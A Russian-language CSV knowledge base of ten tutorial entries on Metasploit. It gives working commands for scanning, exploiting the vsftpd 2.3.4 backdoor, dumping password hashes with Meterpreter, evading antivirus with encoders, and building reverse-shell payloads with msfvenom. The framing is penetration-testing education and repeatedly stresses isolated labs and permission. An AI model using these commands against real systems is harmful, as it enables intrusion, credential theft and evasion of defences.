doc_id,title,content
"msf_001","Что такое Metasploit Framework?","Metasploit Framework (MSF) — это открытая платформа для разработки, тестирования и выполнения эксплойтов. Создана для легального тестирования на проникновение, аудита безопасности и исследований уязвимостей. Включает более 2000 эксплойтов, 1000+ пейлоадов и модули для разведки, пост-эксплуатации и обхода защит. Важно: используйте только в изолированных лабораторных средах (например, Kali Linux + Metasploitable 2) и при наличии письменного разрешения владельца системы."
"msf_002","Установка и запуск в Kali Linux","В Kali Linux Metasploit предустановлен. Запуск: msfconsole — интерактивная консоль. Обновление: msfupdate (или apt update && apt install metasploit-framework). Для работы с БД: msfdb init → db_status. Рекомендация: всегда запускайте от имени обычного пользователя, а не root, чтобы минимизировать риски при ошибках. Для работы с уязвимыми машинами убедитесь, что ВМ находится в изолированной сети (NAT/Host-only)."
"msf_003","Основные команды msfconsole","Ключевые команды консоли: search <keyword> — поиск модулей по имени/описанию; use <path/to/module> — загрузка модуля; show options / show payloads — просмотр настроек; set <VAR> <value> — установка параметра (RHOSTS, LPORT и др.); exploit / run — запуск; sessions -l — список активных сессий; back / exit — навигация. Совет: используйте автодополнение по TAB для ускорения работы."
"msf_004","Типы модулей в Metasploit","MSF использует 6 основных типов модулей: 1. Exploits — код, использующий уязвимость для получения доступа; 2. Payloads — код, выполняемый на целевой системе (reverse/bind shell, meterpreter); 3. Auxiliary — сканеры, снифферы, fuzzers (не требуют эксплуатации); 4. Post — модули пост-эксплуатации (сбор данных, эскалация); 5. Encoders — обфускация пейлоадов для обхода AV; 6. Nops — стабилизация шеллкода. Пример пути: exploit/linux/ssh/utempter_exec."
"msf_005","Работа с payloads: reverse vs bind","Payload — код, выполняемый после успешной эксплуатации. Два основных типа: Reverse TCP — целевая машина подключается к атакующему (LHOST, LPORT). Надёжнее за файрволами, так как исходящие соединения обычно разрешены. Bind TCP — атакующий подключается к открытому порту на цели (RHOST, RPORT). Проще, но часто блокируется. Пример: set payload linux/x86/shell/reverse_tcp → set LHOST 192.168.1.10 → set LPORT 4444. Для расширенного контроля используйте meterpreter."
"msf_006","Сканирование и разведка с auxiliary","Модули auxiliary не эксплуатируют уязвимости, а собирают информацию: scanner/portscan/tcp — TCP-сканирование портов; scanner/ssh/ssh_version — определение версии SSH; scanner/http/dir_scanner — поиск скрытых директорий; gather/enum_linux — сбор информации о системе. Пример: use auxiliary/scanner/portscan/tcp → set RHOSTS 192.168.1.20 → set PORTS 1-1000 → run. Результаты можно экспортировать: db_export -f csv -o scan_results.csv."
"msf_007","Эксплуатация уязвимости: пошаговый пример","Пример атаки на vsftpd 2.3.4 (Metasploitable 2): msfconsole → search vsftpd 2.3.4 → use exploit/unix/ftp/vsftpd_234_backdoor → show options → set RHOSTS 192.168.1.20 → exploit. При успехе откроется командная оболочка на цели. Проверьте: whoami, id, uname -a. Важно: этот эксплойт содержит бэкдор — используйте только в учебной среде. После теста: exit → sessions -K (закрыть все сессии)."
"msf_008","Работа с сессиями и Meterpreter","После успешной эксплуатации создаётся сессия. Управление: sessions -l — список; sessions -i <id> — интерактивный режим; sessions -u <id> — апгрейд до meterpreter; sessions -K — завершить все. Meterpreter работает в памяти, не оставляет следов на диске. Ключевые команды: sysinfo, getuid — информация о системе; shell — переход в обычную оболочку; upload / download — передача файлов; migrate <pid> — внедрение в процесс; hashdump — извлечение хешей паролей."
"msf_009","Обход антивирусов: кодирование и шифрование","Для обхода сигнатурных детекторов: 1. Encoders: msfvenom -p ... -e x86/shikata_ga_nai -i 3 — многократное кодирование; 2. Custom payloads: сборка через msfvenom с исключением байтов (-b '\x00\x0a'); 3. Staged vs Stageless: reverse_tcp (stageless) надёжнее; 4. Encrypt payloads: используйте aes или rc4 в meterpreter. Современные EDR/AV легко детектируют стандартные пейлоады — в реальных тестах требуется кастомизация. В учебных целях: отключайте AV на целевой ВМ."
"msf_010","Генерация пейлоадов через msfvenom","msfvenom — утилита для создания и кодирования пейлоадов вне консоли. Примеры: Linux reverse shell: msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf. Windows exe с кодированием: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -e x86/shikata_ga_nai -i 5 -f exe > payload.exe. Исключение плохих байтов: msfvenom -p ... -b '\x00\x0d\x0a' -f python. Параметры: -p (payload), -f (format), -o (output), --platform, -a (arch)."
